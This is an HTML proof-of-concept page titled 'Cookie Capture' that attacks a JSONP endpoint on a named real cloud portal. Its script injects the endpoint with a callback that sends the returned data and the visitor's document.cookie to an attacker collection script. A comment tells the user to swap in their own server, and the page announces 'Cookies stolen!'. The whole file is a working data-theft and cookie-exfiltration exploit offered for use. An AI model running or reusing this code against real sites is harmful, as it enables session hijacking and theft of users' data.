<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Capture</title>
    <script>
        function call_me(response) {
            // Log the JSONP response and cookies to your server
            var http = new XMLHttpRequest();
            var url = 'http://127.0.0.1/exploit/store.php'; // Replace with your actual server URL
            var params = 'data=' + encodeURIComponent(JSON.stringify(response)) +
                         '&cookie=' + encodeURIComponent(document.cookie); // Capture cookies

            // Send data and cookies to the server
            http.open('POST', url, true);
            http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            http.send(params);
        }

        function loadData() {
            // Load data from JSONP endpoint
            var script = document.createElement('script');
            script.src = 'https://portal-intl.huaweicloud.com/rest/portal/v1/suggest?callback=call_me';
            document.body.appendChild(script);

            // Alert to indicate cookies are stolen
            alert("Cookies stolen!");
        }
    </script>
</head>
<body>
    <button onclick="loadData()">Click here to load data</button>
</body>
</html>
